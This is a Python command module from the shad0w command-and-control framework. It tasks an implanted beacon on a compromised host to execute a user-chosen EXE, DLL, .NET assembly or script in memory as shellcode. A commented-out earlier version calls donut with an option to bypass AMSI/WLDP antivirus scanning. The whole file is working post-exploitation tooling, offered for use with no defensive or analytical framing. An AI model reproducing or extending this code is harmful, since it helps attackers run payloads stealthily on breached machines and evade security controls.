#
# Execute a PE in memory via the beacon
#

import sys
import zlib
import base64
import argparse

from lib import auxiliary
from lib import shellcode

# identify the task as shellcode execute

MODULE_EXEC_ID = 0x2000
USERCD_EXEC_ID = 0x3000

# did the command error

ERROR = False
error_list = ""

# let argparse error and exit nice

def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None): 
    print(message)
    return

def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    # usage examples
    usage_examples = """

Examples:

execute -f msg.exe -p hello world
execute -f msg.exe -c MyClass -m RunProcess -r v3
execute -f msg.dll
execute -f msg.js
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='execute',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-f", "--file", nargs='+', required=True, help=".NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory")
    parse.add_argument("-p", "--param", nargs='+', required=False, help="Arguments to run the file with")
    parse.add_argument("-c", "--cls", required=False, help="Class name. Is required for .NET DLL")
    parse.add_argument("-m", "--method", required=False, help="Method or API name for DLL. Is required for .NET DLL")
    parse.add_argument("-r", "--runtime", required=False, help="CLR runtime version. MetaHeader used by default or v4.0.30319 if none available")
    parse.add_argument("-a", "--appdomain", required=False, help="AppDomain name to create for .NET. Randomly generated by default.")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if ERROR:
        print(error_list) 
        parse.print_help()
        return

    # give a message to the user
    if args.param is None:
        shad0w.debug.log(f"Executing: {''.join(args.file)}", log=True)
        file = ''.join(args.file)
        params = None
    else:
        shad0w.debug.log(f"Executing: \"{''.join(args.file)} {' '.join(args.param)}\"", log=True)
        file = ''.join(args.file)
        params = ' '.join(args.param)

    if params != None:
        # print(params)
        # exit(1)
        b64_comp_data = shellcode.generate(file, args, params)
    elif params == None:
        b64_comp_data = shellcode.generate(file, args, None)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)

    # inform the user of the change
    shad0w.debug.log(f"Tasked beacon ({shad0w.current_beacon})", log=True)

    return

    # print(args)

# def main(shad0w, args):

#     # init argparse

#     ap = argparse.ArgumentParser(prog='execute')
#     ap.exit = exit

#     ap.add_argument("-f", "--file", required=True, help="file with argument to execute")

#     args = ap.parse_args()
#     print(args)

#     # check we have an active beacon

#     if shad0w.current_beacon is None:
#         shad0w.debug.log("ERROR: No active beacon", log=True)
#         return

#     # check if args are correct

#     if len(args) <= 1:
#         shad0w.debug.log(f"No PE file provided...", log=True)
#         return

#     # set the file to use

#     execpe = args[1]

#     # get the pe file and determine if dll or exe

#     try:
#         with open(execpe, "rb") as file:
#             file.read()
#     except IOError:
#         shad0w.debug.log(f"Failed to locate PE file ({args[1]})", log=True)
#         return

#     # load it up

#     try:
#         pe = pefile.PE(execpe)
#     except pefile.PEFormatError:
#         shad0w.debug.log(f"File ({execpe}) is not a valid PE", log=True)
#         return

#     # validify the file

#     if not (pe.is_exe() or pe.is_dll()):
#         shad0w.debug.log(f"Execution of file ({args[1]}) is not currently supported by shad0w :(", log=True)
#         return
    
#     cmd_id = SHELCDE_EXEC_ID

#     """
#     shellcode = donut.create(
#         file='naga.exe',         # .NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory
#         url='http://127.0.0.1',  # HTTP server that will host the donut module
#         arch=1,                  # Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default)
#         bypass=3,                # Bypass AMSI/WLDP : 1=none, 2=abort on fail, 3=continue on fail.(default)
#         cls='namespace.class',   # Optional class name.  (required for .NET DLL)
#         method='method',         # Optional method or API name for DLL. (method is required for .NET DLL)
#         params='arg1 arg2',      # Optional parameters or command line.
#         runtime='version',       # CLR runtime version. MetaHeader used by default or v4.0.30319 if none available
#         appdomain='name'         # AppDomain name to create for .NET. Randomly generated by default.
#     )
#     """

#     # generate shellcode from the pe file using donut

#     # help(donut.create)
#     shellcode_bytes = donut.create(file=execpe)

#     b64_comp_data = base64.b64encode(shellcode_bytes).decode()

#     # set a task for the current beacon to do

#     shad0w.beacons[shad0w.current_beacon]["task"] = (cmd_id, b64_comp_data)

#     # inform the user of the change

#     shad0w.debug.log(f"Tasked beacon ({shad0w.current_beacon})", log=True)

#     return
